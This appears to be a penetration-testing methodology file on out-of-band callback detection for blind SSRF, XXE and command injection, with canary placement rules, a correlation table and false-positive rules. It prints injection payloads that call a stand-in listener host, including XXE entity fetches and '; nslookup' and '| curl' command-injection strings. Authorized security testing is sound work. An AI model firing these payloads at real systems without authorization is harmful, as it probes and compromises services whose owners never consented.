# OOB callbacks: payload families, canary placement, correlation

Out-of-band methodology for blind sinks. Documentation domains only:
`oob.example.com` stands in for the engagement listener domain (arrives via
`REDJOHN_OOB_DOMAIN`), `target.example.com` for the target.

## Listener setup checklist

1. Start the Interactsh-style client inside the RedJohn assessment
   container; session key via env, never the command line.
2. Export the listener domain (`REDJOHN_OOB_DOMAIN=<...>`).
3. Self-check: generate one canary yourself, trigger it from the container,
   confirm it appears in polling. Only then trust the pipeline.
4. Record session start time and the polling cadence (15-30s) in the run
   notes.

## Canary placement rules

- Format: `<nonce>.<engagement-tag>.<listener-domain>`, nonce unique per
  probe (1 probe = 1 canary, never reused). Canary strings overall follow
  `rj-pt-<engagement>-<nonce>`.
- Place the canary as deep in the sink as the sink allows: inside the
  fetched URL's host for SSRF, inside the entity URI for XXE, inside the
  resolver argument for command injection.
- Keep one payload family per probe; compound probes destroy attribution.

## Payload families per blind class

### Blind SSRF (URL-fetching sinks)

```text
param.url = http://<nonce>.oob.example.com/ssrf-probe
param.url = http://<nonce>.oob.example.com:8080/port-probe   # port signal
param.image = //<nonce>.oob.example.com/i                     # protocol-relative
param.hook = http://<nonce>.oob.example.com/h?t=<secret-lead> # NEVER real data in the query
```

- DNS-first: a bare hostname in the param catches parsers that only
  resolve; the HTTP path variant catches full fetches.
- Internal-range probing (169.254.169.254, 10.0.0.0/8) is out of bounds
  unless the engagement scope explicitly includes those ranges.

### Blind XXE (XML-parsing sinks)

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "http://<nonce>.oob.example.com/xxe"> ]>
<r>&xxe;</r>
```

- Parameter-entity variant (when direct entity eval is blocked):
  `<!DOCTYPE r [ <!ENTITY % dtd SYSTEM
  "http://<nonce>.oob.example.com/x.dtd"> %dtd; ]>` — the DTD fetch itself
  is the callback.
- Correlate on DNS + HTTP; a DNS hit without HTTP still proves entity
  resolution.

### Async command injection (documented, benign proofs only)

```text
; nslookup <nonce>.oob.example.com
& ping -c 1 <nonce>.oob.example.com
| curl -s http://<nonce>.oob.example.com/cmd
`nslookup <nonce>.oob.example.com`   (backtick eval contexts)
```

- Resolution proofs only (`nslookup`, `ping -c 1`, `curl` GET). Marker
  echo proofs (`id`, `whoami`, `hostname`) require an in-band or
  exfil-to-listener channel and stay within master impact rules; no
  reverse shells, no destructive commands, ever.

### Other blind classes (listener-supported, owned elsewhere)

- Blind redirect/open-redirect chains: `next=http://<nonce>.oob.example.com/`
  (interaction proves redirect followed server-side; client-side redirect
  proof belongs to `55`).
- Blind SQLi DNS exfil: only with explicit engagement authorization
  (`40-injection-engine` owns payloads; this skill owns the listener).

## Callback-to-probe correlation table

Maintain per engagement (this exact column set):

```text
| probe_id | evidence file              | class  | canary FQDN                  | sent_at  | first_cb | cb_source  | proto | verdict |
|----------|----------------------------|--------|------------------------------|----------|----------|------------|-------|---------|
| p5-014   | evidence/p5-ssrf-014.req.txt | ssrf   | 4f2a91.p3.oob.example.com    | 10:31:04 | 10:31:07 | 203.0.113.9 | http  | hit     |
| p5-015   | evidence/p5-xxe-015.req.txt | xxe    | 7b1c03.p3.oob.example.com    | 10:33:12 | -        | -           | -     | pending |
```

Verdict values: `hit`, `pending` (inside patience window), `negative`
(window elapsed), `false-positive` (rules below).

## False-positive callback rules

1. Canary uniqueness: a hit on a canary that was ever sent anywhere else is
   void — re-probe with a fresh nonce.
2. Source check: corporate link scanners, mail gateways and preview proxies
   prefetch URLs. A callback from an address that is not the target's
   egress (e.g., a scanner range) does not prove the target fetched it;
   corroborate with timing.
3. Timing correlation: the first callback should trail the probe by a
   plausible margin (seconds for direct sinks; within the patience window
   for queued ones). Random-hour-later hits are logged, not claimed.
4. Scope of claim: a callback proves the sink performed DNS/HTTP toward the
   listener. It does not by itself prove arbitrary-file read, data
   exfiltration or command output — state exactly what was demonstrated and
   hand the rest to `40`/`45` for in-band confirmation.

## Patience windows and cadence

| Class | Poll cadence | Minimum patience before `negative` |
|---|---|---|
| Direct SSRF/XXE fetch | 15s | 2 minutes |
| Async job/queue command injection | 30s | 10 minutes |
| Email/SMS/webhook-triggered paths | 60s | engagement-defined (record it) |

Log the window used for every negative verdict; a pending probe is never
silently dropped.
